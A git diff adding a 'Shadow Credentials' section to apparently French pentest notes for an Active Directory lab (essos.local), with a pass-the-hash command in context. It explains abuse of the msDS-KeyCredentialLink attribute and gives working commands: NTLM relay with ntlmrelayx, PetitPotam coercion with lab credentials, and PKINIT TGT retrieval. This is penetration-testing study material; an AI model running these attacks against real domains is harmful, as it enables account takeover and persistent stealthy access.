@@ -42,3 +42,27 @@ Se connecter avec pass-the-hash
 ```bash
 nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490fc9b8'
 ```
+
+## Shadow Credentials
+
+<figure><img src="../.gitbook/assets/6171db8588298f1c4f7d3523_7_graphic-p-1600.png" alt="shadow_credentials"><figcaption></figcaption></figure>
+
+The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT. Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.  There are multiple scenarios where an attacker can have control over an account that has the ability to edit the `msDS-KeyCredentialLink` (a.k.a. "kcl") attribute of other objects (e.g. member of a [special group](https://www.thehacker.recipes/ad/movement/builtins/security-groups), has [powerful ACEs](https://www.thehacker.recipes/ad/movement/dacl/), etc.). This allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).
+
+### Coerce method
+
+```bash
+ntlmrelayx.py -t ldaps://192.168.56.12 --remove-mic -smb2support --shadow-credentials
+```
+
+```bash
+python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
+```
+
+```bash
+python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
+```
+
+```bash
+export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
+```
